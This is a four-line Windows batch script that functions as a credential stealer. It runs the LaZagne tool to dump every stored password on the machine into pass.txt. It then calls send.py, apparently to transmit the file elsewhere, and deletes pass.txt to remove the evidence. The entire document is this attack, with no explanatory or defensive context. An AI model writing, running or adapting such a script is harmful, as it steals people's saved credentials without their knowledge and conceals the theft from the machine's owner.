@Echo off
lazagne.exe all > pass.txt
send.py
del /s "pass.txt"